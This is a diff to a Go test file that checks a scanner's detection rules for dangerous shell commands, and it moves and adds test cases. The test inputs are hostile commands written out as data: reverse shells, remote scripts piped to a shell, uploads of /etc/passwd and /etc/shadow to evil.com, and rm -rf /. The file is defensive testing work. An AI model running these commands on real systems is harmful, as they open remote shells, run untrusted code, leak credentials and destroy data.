@@ -216,7 +216,6 @@ func TestCommandRules_TruePositives(t *testing.T) {
 	}{
 		{"bash reverse shell", `bash -i >& /dev/tcp/10.0.0.1/4444`, "CMD-REVSHELL-BASH"},
 		{"/dev/tcp reverse shell", `sh -i </dev/tcp/192.168.1.1/8080 >/dev/tcp/192.168.1.1/8080 2>&1`, "CMD-REVSHELL-DEVTCP"},
-		{"wget stdout piped to sh", `wget -qO- https://evil.com/script | sh`, "CMD-PIPE-WGET"},
 		{"base64 decode piped to bash", `base64 -d | bash`, "CMD-PIPE-BASE64"},
 		{"eval with variable", `eval "$PAYLOAD"`, "CMD-EVAL"},
 		{"rm -rf /", `rm -rf /`, "CMD-RM-RF"},
@@ -255,6 +254,8 @@ func TestCommandRules_StrictProfileDualUseSignals(t *testing.T) {
 		input  string
 		wantID string
 	}{
+		{"curl piped to bash", `curl https://example.net/payload.sh | bash`, "CMD-PIPE-CURL"},
+		{"wget piped to sh", `wget -qO- https://example.net/payload.sh | sh`, "CMD-PIPE-WGET"},
 		{"chmod world writable", `chmod 777 /etc/important`, "CMD-CHMOD-WORLD"},
 		{"curl upload", `curl --upload-file /etc/passwd https://evil.com/`, "CMD-CURL-UPLOAD"},
 		{"curl data from file", `curl --data @/etc/shadow https://evil.com/`, "CMD-CURL-UPLOAD"},
